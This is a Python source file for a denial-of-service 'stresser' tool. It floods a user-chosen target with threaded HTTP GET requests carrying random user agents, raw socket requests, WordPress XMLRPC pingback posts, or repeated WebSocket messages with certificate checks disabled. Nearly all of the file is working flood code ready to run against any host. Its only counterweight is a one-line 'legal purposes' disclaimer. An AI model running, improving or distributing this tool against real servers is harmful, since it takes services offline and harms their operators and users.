#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Chub Stresser Script v1.0
# Author: Muchub (https://github.com/muchub/)
# Purpose: DoS (Denial of Service) tool for testing servers
# Usage: python3 chub.py
# Note: Use responsibly and only for legal purposes

import requests
import fake_useragent
import time
import threading
import socket
import os
from colorama import Fore, Style
import asyncio
import websockets
import ssl


def chub_ascii():
    print(
        Fore.GREEN
        + """
             /\_/\\  """
        + Fore.RED
        + "Chub"
        + Fore.RED
        + " Stresser !"
        + Fore.GREEN
        + """
            ( o.o ) """
        + Fore.BLUE
        + "Use at your own risk :v"
        + Fore.GREEN
        + """
             > ^ < """
        + Fore.BLUE
        + " Author - "
        + Fore.GREEN
        + "Muchub"
        + Fore.GREEN
        + """
        """
        + Style.RESET_ALL
    )


def print_up(thread_id):
    print(
        Fore.GREEN
        + f"\rThread {thread_id}: Request Sent, Server up      "
        + Style.RESET_ALL,
        end="",
    )


def print_down(thread_id):
    print(
        Fore.RED
        + f"\rThread {thread_id}: Cannot reach server !!!        "
        + Style.RESET_ALL,
        end="",
    )


def sending_socket(thread_id):
    print(
        Fore.BLUE
        + f"\rThread {thread_id}: Sending message to server..        "
        + Style.RESET_ALL,
        end="",
    )


def chub_user_agent():
    user_agent = fake_useragent.UserAgent()
    return user_agent.random


async def chubWebSocketAttack(host, msg, msg_num, thread_id):
    while True:
        try:
            async with websockets.connect(host) as websocket:
                while True:
                    try:
                        await websocket.send(msg * msg_num)  # keep connection alive
                        sending_socket(thread_id)
                    except websockets.ConnectionClosed:
                        print_up(thread_id)
                    except Exception as e:
                        print_down(thread_id)

                    await asyncio.sleep(1)
        except Exception as e:
            print_down(thread_id)


async def chubSecureWebSocketAttack(host, msg, msg_num, thread_id):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    while True:
        try:
            async with websockets.connect(host, ssl=ssl_context) as websocket:
                while True:
                    try:
                        await websocket.send(msg * msg_num)  # keep connection alive
                        sending_socket(thread_id)
                    except websockets.ConnectionClosed:
                        print_up(thread_id)
                    except Exception as e:
                        print_down(thread_id)
                    await asyncio.sleep(1)
        except Exception as e:
            print_down(thread_id)


def chub_request(host, headers, thread_id, target_port, word, word_num):
    global user_option, num_timeout

    if user_option == 0:  # Using normal get request
        while True:
            try:
                requests.get(host, headers=headers, timeout=num_timeout)
                print_up(thread_id)
            except requests.RequestException as e:
                print_down(thread_id)
    if user_option == 1:  # using socket
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((host, target_port))
                client_socket.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                print_up(thread_id)
                time.sleep(num_timeout)
            except Exception as e:
                print_down(thread_id)
    if user_option == 2:  # XMLRPC DoS
        while True:
            try:
                payload = f"""<?xml version="1.0"?>
                                <methodCall>
                                <methodName>pingback.ping</methodName>
                                <params>
                                    <param><value><string>{host}</string></value></param>
                                    <param><value><string>https://target-site.com/</string></value></param>
                                </params>
                                </methodCall>"""
                requests.post(
                    host,
                    data=payload,
                    headers={"Content-Type": "text/xml"},
                    timeout=num_timeout,
                )
                print_up(thread_id)
            except Exception as e:
                print_down(thread_id)
    if user_option == 3:
        if "ws://" in host:
            try:
                # Run the asyncio event loop
                asyncio.run(chubWebSocketAttack(host, word, word_num, thread_id))
            except Exception as e:
                print(f"An error occurred: {e}")
        elif "wss://" in host:
            try:
                # Run the asyncio event loop
                asyncio.run(chubSecureWebSocketAttack(host, word, word_num, thread_id))
            except Exception as e:
                print(f"An error occurred: {e}")


def chub_thread(thread_id, target_host, target_port, msg, msg_num):
    random_user_agent = chub_user_agent()
    custom_headers = {
        "User-Agent": random_user_agent,
    }
    chub_request(target_host, custom_headers, thread_id, target_port, msg, msg_num)


if __name__ == "__main__":
    try:
        os.system("cls")
        chub_ascii()
        options = [
            "Using direct URL (http://example.com)",
            "Using DNS or IP (example.com or 127.0.0.1)",
            "Wordpress XMLRPC Flood",
            "WebSocket/SecureWebSucket Flood",
        ]
        for i in range(len(options)):
            print(f"{i}. {options[i]}")
        user_option = -1
        while user_option > len(options) or user_option < 0:
            user_option = int(input("\nEnter option: "))

        os.system("cls")
        chub_ascii()

        target_port = 0  # just initialize
        message = ""
        message_num = 0

        if user_option == 0:
            target_host = input("Enter target URL (http://example.com): ")

        if user_option == 1:
            target_host = input("Enter target host: ")
            target_port = int(input("Enter target port: "))

        if user_option == 2:
            target_host = input("Enter XMLRPC URL (http://example.com/xmlrpc.php): ")

        if user_option == 3:
            target_host = input(
                "Enter WS/WSS Connection (ws://example.com:8080 or wss://example.com:8080): "
            )
            message = input(
                "Enter message to server (Hello Server ! or what ever you like): "
            )
            message_num = int(
                input("Enter message number (more larger more effective): ")
            )

        num_timeout = int(
            input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL)
        )
        num_threads = int(
            input("Enter the number of " + Fore.RED + "threads: " + Style.RESET_ALL)
        )

        # Create threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=chub_thread,
                args=(i, target_host, target_port, message, message_num),
            )
            threads.append(thread)

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("\nProgram interrupted by user.")
